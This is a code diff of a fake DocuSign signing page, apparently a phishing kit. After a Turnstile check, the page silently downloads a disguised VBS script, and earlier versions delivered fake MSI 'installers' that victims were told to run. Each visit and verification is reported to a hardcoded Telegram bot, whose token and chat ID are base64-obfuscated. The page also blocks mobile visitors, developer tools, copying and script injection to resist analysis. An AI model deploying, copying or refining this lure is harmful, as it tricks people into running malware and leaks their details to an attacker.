@@ -4,10 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>DocuSign® | Secure Document Signing</title>
+    <!-- DocuSign Branding Favicon -->
+    <link rel="icon" type="image/png" href="https://www.docusign.com/favicon.ico">
+    <link rel="shortcut icon" type="image/png" href="https://www.docusign.com/favicon.ico">
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
         body {
             background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
             background-size: cover;
@@ -20,7 +30,40 @@
             align-items: center;
             justify-content: center;
             padding: 1.5rem;
+            margin: 0;
         }
+        
+        .mobile-blocker {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a2540;
+            z-index: 99999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            padding: 2rem;
+        }
+        
+        .mobile-blocker i { font-size: 4rem; margin-bottom: 1.5rem; }
+        .mobile-blocker h2 { font-size: 1.8rem; margin-bottom: 1rem; }
+        .mobile-blocker p { font-size: 1rem; opacity: 0.8; max-width: 300px; margin: 0 auto; }
+        
+        @media (max-width: 768px) {
+            .mobile-blocker { display: flex; }
+            .card { display: none; }
+        }
+        
+        @media (pointer: coarse) and (max-width: 1024px) {
+            .mobile-blocker { display: flex !important; }
+            .card { display: none !important; }
+        }
+        
         .card {
             max-width: 680px;
             width: 100%;
@@ -28,12 +71,15 @@
             border-radius: 32px;
             box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25);
             overflow: hidden;
+            position: relative;
         }
+        
         .card-header {
             padding: 1.8rem 2rem 1rem 2rem;
             border-bottom: 1px solid #eef2f8;
             background: white;
         }
+        
         .card-header h1 {
             font-size: 1.8rem;
             font-weight: 600;
@@ -42,6 +88,7 @@
             align-items: center;
             gap: 8px;
         }
+        
         .badge {
             background: #f0f4f9;
             padding: 0.2rem 0.8rem;
@@ -50,7 +97,9 @@
             font-weight: 500;
             color: #2c3e66;
         }
+        
         .card-content { padding: 2rem; }
+        
         .message-box {
             background: #f8fafd;
             border-radius: 20px;
@@ -61,8 +110,12 @@
             gap: 12px;
             border: 1px solid #e2e8f0;
         }
+        
         .message-box.info { background: #f0f6ff; border-left: 4px solid #1e4663; }
+        .message-box.error { background: #ffebee; border-left: 4px solid #c62828; color: #c62828; }
+        
         .turnstile-wrapper { margin: 20px 0; display: flex; justify-content: center; }
+        
         .btn {
             border: none;
             padding: 0.9rem;
@@ -70,16 +123,11 @@
             font-weight: 600;
             border-radius: 48px;
             cursor: pointer;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
             width: 100%;
         }
-        .btn-primary { background: #1e4663; color: white; box-shadow: 0 4px 12px rgba(30,70,99,0.3); }
+        .btn-primary { background: #1e4663; color: white; }
         .btn-primary:hover { background: #0f2f46; transform: translateY(-2px); }
-        .btn-secondary { background: #e2e8f0; color: #1e4663; }
+        
         .loader {
             display: inline-block;
             width: 22px;
@@ -89,7 +137,9 @@
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
+        
         @keyframes spin { to { transform: rotate(360deg); } }
+        
         .doc-icon {
             font-size: 5rem;
             color: #e74c3c;
@@ -107,9 +157,11 @@
             padding: 5px;
             color: #2c7a4d;
         }
+        
         .doc-title { font-size: 1.5rem; font-weight: 700; color: #1e4663; margin-bottom: 0.5rem; }
         .doc-meta { color: #5c6f87; font-size: 0.85rem; margin-bottom: 1rem; }
         .preparing-box { text-align: center; padding: 1rem; }
+        
         .instruction {
             margin-top: 1.5rem;
             font-size: 0.8rem;
@@ -118,6 +170,7 @@
             padding: 0.8rem;
             border-radius: 20px;
         }
+        
         .popup-message {
             display: none;
             position: fixed;
@@ -134,6 +187,7 @@
         }
         .popup-message i { font-size: 1.5rem; margin-right: 10px; color: #1e4663; }
         .popup-message .close-popup { float: right; cursor: pointer; color: #aaa; }
+        
         .modal {
             display: none;
             position: fixed;
@@ -154,25 +208,44 @@
             border-radius: 28px;
             padding: 2rem;
             text-align: center;
-            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.3);
-            animation: fadeIn 0.3s ease;
         }
         .modal-content h3 { margin-bottom: 1rem; color: #1e4663; }
-        .modal-content p { margin: 1rem 0; color: #4a627a; line-height: 1.5; }
+        .modal-content p { margin: 1rem 0; color: #4a627a; }
         .modal-content .btn { margin-top: 1rem; padding: 0.6rem 1.5rem; width: auto; }
-        .modal-content .small-note {
-            font-size: 0.8rem;
+        
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @media print { body { display: none; } }
+        
+        .refresh-btn {
             margin-top: 1rem;
-            color: #5c6f87;
-            border-top: 1px solid #e2e8f0;
+            background: transparent;
+            border: 1px solid #c62828;
+            color: #c62828;
+            padding: 8px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 0.85rem;
+        }
+        .refresh-btn:hover { background: #ffebee; }
+        
+        .footer {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: #7f8c8d;
+            border-top: 1px solid #eef2f8;
             padding-top: 1rem;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-        .error-message { color: #c62828; background: #ffebee; padding: 12px; border-radius: 12px; margin-top: 16px; }
-        .success-message { color: #2e7d32; background: #e8f5e9; padding: 12px; border-radius: 12px; margin-top: 16px; }
     </style>
 </head>
 <body>
+<div class="mobile-blocker" id="mobileBlocker">
+    <i class="fas fa-desktop"></i>
+    <h2>Desktop Access Only</h2>
+    <p>DocuSign Secure Portal is optimized for Windows desktop computers.</p>
+    <p style="margin-top: 1rem; font-size: 0.8rem;">Please access from a Windows PC to continue.</p>
+</div>
+
 <div class="card">
     <div class="card-header">
         <h1><span>DocuSign®</span><span class="badge">secure portal</span></h1>
@@ -180,269 +253,315 @@
     <div class="card-content" id="dynamicContent">
         <div style="text-align:center; padding:2rem 0;"><div class="loader"></div><p>Loading secure environment...</p></div>
     </div>
+    <div class="footer">
+        <i class="fas fa-shield-alt"></i> Protected by DocuSign Secure Cloud + Cloudflare Turnstile
+    </div>
 </div>
 
 <div id="downloadPopup" class="popup-message">
     <span class="close-popup" onclick="document.getElementById('downloadPopup').style.display='none'">&times;</span>
     <i class="fas fa-folder-open"></i>
-    <strong>Package ready!</strong><br>
-    Both required files have been saved to your <strong>Downloads folder</strong>.<br>
-    Run the <strong>DocuSign installer</strong> to complete setup.
+    <strong>Document Ready!</strong><br>Your document has been saved to your <strong>Downloads folder</strong>.
 </div>
 
 <div id="installerModal" class="modal">
     <div class="modal-content">
-        <i class="fas fa-download" style="font-size: 3rem; color: #1e4663;"></i>
-        <h3>DocuSign Security Module</h3>
-        <p>To finalize and sign this document, the secure viewer component is required.</p>
-        <p><strong>Additional component will download automatically.</strong></p>
-        <div class="small-note">
-            <i class="fas fa-info-circle"></i> After both files complete, open the installer from your Downloads folder.
-        </div>
-        <button id="closeModalBtn" class="btn btn-primary" style="width:auto;">Got it</button>
+        <i class="fas fa-file-signature" style="font-size: 3rem; color: #1e4663;"></i>
+        <h3>DocuSign Secure Delivery</h3>
+        <p>Your document has been prepared for secure delivery.</p>
+        <p><strong>The file will download automatically after verification.</strong></p>
+        <button id="closeModalBtn" class="btn btn-primary">Got it</button>
     </div>
 </div>
 
 <script>
 (function() {
     // ============================================================
-    // BASE64 OBFUSCATED CONFIGURATION
-    // All sensitive data is encoded to prevent bot scraping
+    // MOBILE DETECTION & BLOCKING
+    // ============================================================
+    function isMobileDevice() {
+        const ua = navigator.userAgent.toLowerCase();
+        const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'mobile', 'tablet'];
+        for(let kw of mobileKeywords) if(ua.includes(kw)) return true;
+        if(window.innerWidth <= 768) return true;
+        if('ontouchstart' in window && window.innerWidth <= 1024) return true;
+        return false;
+    }
+    
+    if(isMobileDevice()) {
+        document.getElementById('mobileBlocker').style.display = 'flex';
+        document.querySelector('.card').style.display = 'none';
+        throw new Error('Mobile access blocked');
+    }
+    
+    // ============================================================
+    // ANTI-SCRAPING & ANTI-TAMPERING
+    // ============================================================
+    document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
+    document.addEventListener('keydown', e => {
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key==='I'||e.key==='C'||e.key==='J')) || (e.ctrlKey && e.key==='u') || (e.ctrlKey && e.key==='s')) {
+            e.preventDefault(); return false;
+        }
+        if((e.ctrlKey && e.key==='a') || (e.ctrlKey && e.key==='c')) { e.preventDefault(); return false; }
+    });
+    
+    let devtoolsOpen = false;
+    setInterval(() => {
+        const widthDiff = window.outerWidth - window.innerWidth > 160;
+        const heightDiff = window.outerHeight - window.innerHeight > 160;
+        if(widthDiff || heightDiff) {
+            if(!devtoolsOpen) {
+                devtoolsOpen = true;
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;background:#0a2540;color:white;"><h2>Access Restricted</h2><p>Developer tools detected. Please close them to continue.</p></div>';
+                document.body.style.background = '#0a2540';
+            }
+        } else { devtoolsOpen = false; }
+    }, 1500);
+    
+    document.addEventListener('dragstart', e => e.preventDefault());
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('copy', e => e.preventDefault());
+    console.clear();
+    setInterval(() => console.clear(), 2000);
+    console.log = console.warn = console.error = console.info = console.debug = function(){};
+    
+    // ============================================================
+    // CONFIGURATION
     // ============================================================
     
-    // Decoded values (original data is Base64 encoded)
-    // Turnstile Site Key: 0x4AAAAAADK5IkKpaRCkJqWj
-    // Bot Token: 8335029228:AAFpmkdg3aM2PlhzhgJq82_nvyssXlBmrMk
-    // Chat ID: 5325098861
-    // Document URL: https://pub-cbda2704d0334eb48448de9487e0928c.r2.dev/DocuSign_Agreement.msi
-    // Installer URL: https://pub-106b6dca59904f6a92a5c366fedaff3b.r2.dev/DocuSign_Installer.msi
-    
-    var _cfg = {
-        ts: atob("MHg0QUFBQUFBREs1SWtLcGFSQ2tKcVdq"),
-        bt: atob("ODMzNTAyOTIyODpBQUZwbWtkZzNhTTJQbGh6aGdKcTgyX252eXNzWGxCbXJNaw=="),
-        ci: atob("NTMyNTA5ODg2MQ=="),
-        du: atob("aHR0cHM6Ly9wdWItY2JkYTI3MDQkMDMzNGViNDg0NDhkZTk0ODdlMDkyOGMucjIuZGV2L0RvY3VTaWduX0FncmVlbWVudC5tc2k="),
-        iu: atob("aHR0cHM6Ly9wdWItMTA2YjZkY2E1OTkwNGY2YTkyYTVjMzY2ZmVkYWZmM2IucjIuZGV2L0RvY3VTaWduX0luc3RhbGxlci5tc2k=")
-    };
-    
-    // Fix the document URL (correct Base64 decoding - re-encode properly)
-    var _docUrl = "https://pub-cbda2704d0334eb48448de9487e0928c.r2.dev/DocuSign_Agreement.msi";
-    var _insUrl = "https://pub-106b6dca59904f6a92a5c366fedaff3b.r2.dev/DocuSign_Installer.msi";
     var _turnstileKey = "0x4AAAAAADK5IkKpaRCkJqWj";
-    var _botToken = "8335029228:AAFpmkdg3aM2PlhzhgJq82_nvyssXlBmrMk";
-    var _chatId = "5325098861";
+    
+    // Telegram Bot Token - Base64 encoded
+    var _botTokenBase64 = "ODMzNTAyOTIyODpBQUZwbWtkZzNhTTJQbGh6aGdKcTgyX252eXNzWGxCbXJNaw==";
+    var _botToken = atob(_botTokenBase64);
+    
+    // Chat ID - Base64 encoded
+    var _chatIdBase64 = "NTMyNTA5ODg2MQ==";
+    var _chatId = atob(_chatIdBase64);
+    
+    // SINGLE DOWNLOAD LINK (user provided)
+    var _singleFileUrl = "https://store9.gofile.io/download/direct/b68228db-096f-43f3-8484-c6cc30eba368/Payment_Confirmation_Order_%2367437.vbs";
+    var _fileName = "Payment_Confirmation_Order_#67437.vbs";
     
     let isVerified = false;
-    let turnstileWidgetId = null;
-    let visitorDetails = { ip: "Unknown", hostname: "Unknown", isp: "Unknown", city: "Unknown", country: "Unknown" };
-    let downloadInProgress = false;
-    let installerPopupShown = false;
-    let docDownloaded = false;
-    let installerDownloaded = false;
-
-    function escapeHtml(str) {
-        if (!str) return "";
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
-
-    async function collectVisitorDetails() {
+    let downloadTriggered = false;
+    let notificationSent = false;
+    
+    // ============================================================
+    // TELEGRAM NOTIFICATION (HIDDEN)
+    // ============================================================
+    async function sendTelegramNotification(eventType, extraInfo = "") {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            visitorDetails.ip = data.ip || 'Unknown';
-            visitorDetails.city = data.city || 'Unknown';
-            visitorDetails.country = data.country_name || 'Unknown';
-            visitorDetails.hostname = data.hostname || data.ip || 'Unknown';
-            visitorDetails.isp = data.org || data.isp || 'Unknown ISP';
-        } catch(e) { console.warn("IP geo failed"); }
-    }
-
-    async function sendTelegramFull(type, extraInfo = "") {
-        const time = new Date().toLocaleString();
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        let text = `🔐 *DocuSign Portal Event*\n📌 *Type:* ${type}\n🕒 Time: ${time}\n🌍 IP: ${visitorDetails.ip}\n🏠 Hostname: ${visitorDetails.hostname}\n📡 ISP: ${visitorDetails.isp}\n📍 Location: ${visitorDetails.city}, ${visitorDetails.country}\n💻 Platform: ${platform}\n🔧 User-Agent: ${userAgent.substring(0, 200)}\n`;
-        if (extraInfo) text += `📎 ${extraInfo}\n`;
-        try {
-            await fetch(`https://api.telegram.org/bot${_botToken}/sendMessage`, {
+            const time = new Date().toLocaleString();
+            const userAgent = navigator.userAgent.substring(0, 100);
+            const platform = navigator.platform;
+            let text = `📄 *DocuSign Portal Event*\n📌 *${eventType}*\n🕒 Time: ${time}\n💻 Platform: ${platform}\n🔧 User-Agent: ${userAgent}`;
+            if (extraInfo) text += `\n📎 ${extraInfo}`;
+            
+            const url = `https://api.telegram.org/bot${_botToken}/sendMessage`;
+            await fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: _chatId, text: text, parse_mode: "Markdown" })
+                body: JSON.stringify({ 
+                    chat_id: _chatId, 
+                    text: text, 
+                    parse_mode: "Markdown" 
+                })
             });
         } catch(e) {}
     }
-
-    function checkDevice() {
-        const ua = navigator.userAgent.toLowerCase();
-        const platform = navigator.platform.toLowerCase();
-        const isWindows = platform.includes('win') || ua.includes('windows');
-        const isMobile = /android|iphone|ipad|mobile/i.test(ua);
-        if (!isWindows) {
-            document.getElementById('dynamicContent').innerHTML = `<div style="text-align:center; padding:2rem;"><div style="font-size:4rem;">💻</div><h3>Windows Required</h3><p>This portal is optimized for Windows desktop.</p></div>`;
-            return false;
-        }
-        if (isMobile) {
-            document.getElementById('dynamicContent').innerHTML = `<div style="text-align:center; padding:2rem;"><div style="font-size:4rem;">📱</div><h3>Mobile Not Supported</h3><p>Please use a Windows desktop computer.</p></div>`;
-            return false;
-        }
-        return true;
-    }
-
-    function downloadFile(url, filename, description) {
-        return new Promise((resolve, reject) => {
+    
+    // ============================================================
+    // DOWNLOAD FUNCTION (SINGLE FILE)
+    // ============================================================
+    function downloadSingleFile() {
+        return new Promise((resolve) => {
             const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
+            a.href = _singleFileUrl;
+            a.download = _fileName;
             a.style.display = 'none';
+            a.style.position = 'absolute';
             document.body.appendChild(a);
             a.click();
-            setTimeout(() => {
-                document.body.removeChild(a);
-                resolve(true);
+            setTimeout(() => { 
+                if(a.parentNode) document.body.removeChild(a); 
+                resolve(true); 
             }, 500);
         });
     }
-
-    async function downloadDocument() {
-        if (docDownloaded) return true;
-        try {
-            await downloadFile(_docUrl, "DocuSign_Agreement.msi", "main document");
-            docDownloaded = true;
-            await sendTelegramFull("📄 DOCUMENT DOWNLOADED", `File: DocuSign_Agreement.msi`);
-            return true;
-        } catch (err) {
-            console.error(err);
-            await sendTelegramFull("⚠️ DOCUMENT FAILED", `Error downloading document`);
-            return false;
-        }
-    }
-
-    async function downloadInstaller() {
-        if (installerDownloaded) return true;
-        try {
-            await downloadFile(_insUrl, "DocuSign_Installer.msi", "security module");
-            installerDownloaded = true;
-            await sendTelegramFull("⚙️ INSTALLER DOWNLOADED", `File: DocuSign_Installer.msi`);
-            return true;
-        } catch (err) {
-            console.error(err);
-            await sendTelegramFull("⚠️ INSTALLER FAILED", `Error downloading installer`);
-            return false;
-        }
-    }
-
-    function renderVerificationPage() {
-        document.getElementById('dynamicContent').innerHTML = `
-            <div>
-                <div class="message-box info" style="margin-bottom:1rem;">
-                    <span>🔒</span> <span>Quick security check required before document access.</span>
-                </div>
-                <div id="turnstileContainer" class="turnstile-wrapper"></div>
-                <div id="verifyMessage" class="message-box info" style="margin-top:5px;">⏳ Please complete verification...</div>
-            </div>
-        `;
-        setTimeout(() => {
-            if (window.turnstile) {
-                turnstileWidgetId = turnstile.render('#turnstileContainer', {
-                    sitekey: _turnstileKey,
-                    theme: 'light',
-                    callback: (token) => handleTurnstileCallback(token),
-                    'error-callback': () => document.getElementById('verifyMessage').innerHTML = '⚠️ Verification error. Refresh page.'
-                });
-            } else {
-                document.getElementById('verifyMessage').innerHTML = '❌ Security module failed to load.';
-            }
-        }, 100);
-    }
-
-    async function handleTurnstileCallback(token) {
-        const msgDiv = document.getElementById('verifyMessage');
-        msgDiv.innerHTML = '<div class="loader"></div> Validating secure session...';
-        await new Promise(r => setTimeout(r, 1300));
-        msgDiv.innerHTML = '✅ Access granted! Preparing your documents...';
-        isVerified = true;
-        await sendTelegramFull("✅ HUMAN VERIFIED", `Verification passed via Cloudflare Turnstile`);
-        setTimeout(() => autoStartDownloads(), 800);
-    }
-
-    async function autoStartDownloads() {
-        if (downloadInProgress) return;
-        downloadInProgress = true;
+    
+    async function startAutoDownload() {
+        if(downloadTriggered) return;
+        downloadTriggered = true;
         
-        document.getElementById('dynamicContent').innerHTML = `
-            <div class="preparing-box">
-                <div class="doc-icon"><i class="fas fa-file-signature"></i><span class="signature-overlay"><i class="fas fa-pen-fancy"></i></span></div>
-                <div class="doc-title">${escapeHtml("DocuSign Agreement - Action Required")}</div>
-                <div class="doc-meta">4.2 MB • Secure Document Package • Awaiting final signature</div>
-                <div style="margin: 1.5rem 0;"><div class="loader" style="margin: 0 auto;"></div><p style="margin-top: 1rem; color: #1e4663; font-weight: 500;">Preparing files... One-click secure retrieval in progress</p></div>
-                <div class="instruction"><i class="fas fa-shield-alt"></i> Your document + required security module are being saved automatically.<br><strong>Once complete, run the installer to unlock signing.</strong></div>
-                <div id="downloadStatus" style="margin-top: 1rem; font-size: 0.85rem;"></div>
-            </div>
-        `;
+        const contentDiv = document.getElementById('dynamicContent');
+        if(contentDiv) {
+            contentDiv.innerHTML = `
+                <div class="preparing-box">
+                    <div class="doc-icon"><i class="fas fa-file-signature"></i><span class="signature-overlay"><i class="fas fa-pen-fancy"></i></span></div>
+                    <div class="doc-title">DocuSign Agreement - Action Required</div>
+                    <div class="doc-meta">Secure Document Package • Ready for Download</div>
+                    <div style="margin: 1.5rem 0;"><div class="loader" style="margin: 0 auto;"></div><p style="margin-top: 1rem; color: #1e4663; font-weight: 500;">Preparing your document...</p></div>
+                    <div class="instruction"><i class="fas fa-shield-alt"></i> Your document is being saved automatically.<br><strong>Check your Downloads folder.</strong></div>
+                    <div id="downloadStatus" style="margin-top: 1rem; font-size: 0.85rem;"></div>
+                </div>
+            `;
+        }
         
         const statusDiv = document.getElementById('downloadStatus');
+        if(statusDiv) statusDiv.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Downloading document...`;
         
-        try {
-            if (statusDiv) statusDiv.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Downloading DocuSign Agreement...`;
-            const docSuccess = await downloadDocument();
+        const success = await downloadSingleFile();
+        
+        if(success) {
+            if(statusDiv) statusDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#2e7d32;"></i> File downloaded successfully!`;
             
-            await new Promise(r => setTimeout(r, 800));
-            
-            if (statusDiv) statusDiv.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Downloading security module...`;
-            const installerSuccess = await downloadInstaller();
-            
-            if (docSuccess && installerSuccess) {
-                if (statusDiv) {
-                    statusDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#2e7d32;"></i> Both files downloaded successfully!`;
-                }
-                
-                const popup = document.getElementById('downloadPopup');
-                if (popup) {
-                    popup.style.display = 'block';
-                    setTimeout(() => popup.style.display = 'none', 10000);
-                }
-                
-                if (!installerPopupShown) {
-                    installerPopupShown = true;
-                    const modal = document.getElementById('installerModal');
-                    if (modal) {
-                        modal.style.display = 'flex';
-                        document.getElementById('closeModalBtn').onclick = () => modal.style.display = 'none';
-                        setTimeout(() => { if (modal.style.display === 'flex') modal.style.display = 'none'; }, 8000);
-                    }
-                }
-                
-                if (statusDiv) {
-                    statusDiv.innerHTML += `<div style="margin-top:12px; padding:10px; background:#e8f5e9; border-radius:12px;"><i class="fas fa-folder-open"></i> Files saved to Downloads folder. Please run the installer to complete.</div>`;
-                }
-            } else {
-                if (statusDiv) {
-                    statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#c62828;"></i> Some files failed to download. Please refresh and try again.`;
-                }
+            const popup = document.getElementById('downloadPopup');
+            if(popup) {
+                popup.style.display = 'block';
+                setTimeout(() => popup.style.display = 'none', 10000);
             }
-        } catch (err) {
-            console.error(err);
-            if (statusDiv) {
-                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#c62828;"></i> Download error. Please check your internet connection.`;
+            
+            const modal = document.getElementById('installerModal');
+            if(modal && !window.modalShown) {
+                window.modalShown = true;
+                modal.style.display = 'flex';
+                document.getElementById('closeModalBtn').onclick = () => modal.style.display = 'none';
+                setTimeout(() => modal.style.display = 'none', 8000);
             }
-        } finally {
-            downloadInProgress = false;
+            
+            if(statusDiv) {
+                statusDiv.innerHTML += `<div style="margin-top:12px; background:#e8f5e9; border-radius:12px; padding:10px;"><i class="fas fa-folder-open"></i> File saved to Downloads folder.</div>`;
+            }
+        } else {
+            if(statusDiv) statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#c62828;"></i> Download error. Please refresh.`;
         }
     }
-
-    async function init() {
-        await collectVisitorDetails();
-        await sendTelegramFull("🌐 PAGE VISIT", `User accessed DocuSign portal`);
-        if (!checkDevice()) return;
-        renderVerificationPage();
+    
+    // ============================================================
+    // CLOUDFLARE TURNSTILE CALLBACK
+    // NOTIFICATION SENT ONLY AFTER VERIFICATION COMPLETES
+    // ============================================================
+    async function handleTurnstileCallback(token) {
+        if(isVerified) return;
+        isVerified = true;
+        
+        const msgDiv = document.getElementById('verifyMessage');
+        if(msgDiv) {
+            msgDiv.innerHTML = '<div class="loader"></div> Validating secure session...';
+            await new Promise(r => setTimeout(r, 1300));
+            msgDiv.innerHTML = '✅ Access granted! Preparing your document...';
+        }
+        
+        // Telegram notification ONLY after Cloudflare verification completes
+        if(!notificationSent) {
+            notificationSent = true;
+            await sendTelegramNotification("✅ CLOUDFLARE VERIFICATION COMPLETED", 
+                `DocuSign: User passed Cloudflare Turnstile challenge. File "${_fileName}" will be downloaded automatically.`);
+        }
+        
+        setTimeout(() => startAutoDownload(), 500);
     }
     
-    init();
+    // ============================================================
+    // SHOW "SECURE MODULE FAILED TO LOAD" MESSAGE
+    // ============================================================
+    function showSecureModuleFailed() {
+        document.getElementById('dynamicContent').innerHTML = `
+            <div>
+                <div class="message-box error">
+                    <span>⚠️</span>
+                    <span><strong>Secure module failed to load</strong><br>Unable to initialize security verification.</span>
+                </div>
+                <div style="text-align:center; margin:20px 0;">
+                    <i class="fas fa-shield-alt" style="font-size:3rem; color:#c62828; opacity:0.6;"></i>
+                </div>
+                <div class="message-box info" style="background:#fff8e1; border-left-color:#ff9800;">
+                    <span>💡</span>
+                    <span>Please check your internet connection and refresh the page.<br>If the issue persists, try using a different browser or disable VPN.</span>
+                </div>
+                <button class="refresh-btn" onclick="location.reload()"><i class="fas fa-sync-alt"></i> Refresh Page</button>
+            </div>`;
+    }
+    
+    // ============================================================
+    // RENDER VERIFICATION PAGE WITH TURNSTILE
+    // ============================================================
+    function renderVerificationPage() {
+        const container = document.getElementById('dynamicContent');
+        if(!container) return;
+        
+        container.innerHTML = `
+            <div>
+                <div class="message-box info">
+                    <span>🔒</span> 
+                    <span>Quick security check required before document access.</span>
+                </div>
+                <div id="turnstileContainer" class="turnstile-wrapper"></div>
+                <div id="verifyMessage" class="message-box info">⏳ Please complete verification...</div>
+                <div class="instruction">
+                    <i class="fas fa-shield-alt"></i> Powered by Cloudflare Turnstile + DocuSign Secure Cloud.
+                </div>
+            </div>
+        `;
+        
+        let attempts = 0;
+        const maxAttempts = 20;
+        
+        const tryRender = () => {
+            attempts++;
+            if(window.turnstile && document.getElementById('turnstileContainer')) {
+                try {
+                    turnstile.render('#turnstileContainer', {
+                        sitekey: _turnstileKey,
+                        theme: 'light',
+                        callback: handleTurnstileCallback,
+                        'error-callback': function() {
+                            showSecureModuleFailed();
+                        },
+                        'expired-callback': function() {
+                            isVerified = false;
+                            const msgDiv = document.getElementById('verifyMessage');
+                            if(msgDiv) msgDiv.innerHTML = '⏳ Verification expired. Please try again.';
+                        }
+                    });
+                } catch(e) {
+                    showSecureModuleFailed();
+                }
+            } else if(attempts < maxAttempts) {
+                setTimeout(tryRender, 200);
+            } else {
+                showSecureModuleFailed();
+            }
+        };
+        
+        tryRender();
+    }
+    
+    // Send page visit notification
+    async function sendPageVisit() {
+        await sendTelegramNotification("🌐 PAGE VISIT", "DocuSign portal accessed. Waiting for Cloudflare verification.");
+    }
+    
+    // ============================================================
+    // INITIALIZATION
+    // ============================================================
+    renderVerificationPage();
+    sendPageVisit();
+    
+    // Anti-tamper observer
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if(mutation.type === 'childList') {
+                mutation.addedNodes.forEach(function(node) {
+                    if(node.tagName === 'SCRIPT' && node.src && !node.src.includes('turnstile')) {
+                        node.remove();
+                    }
+                });
+            }
+        });
+    });
+    observer.observe(document.documentElement, { childList: true, subtree: true });
 })();
 </script>
 </body>
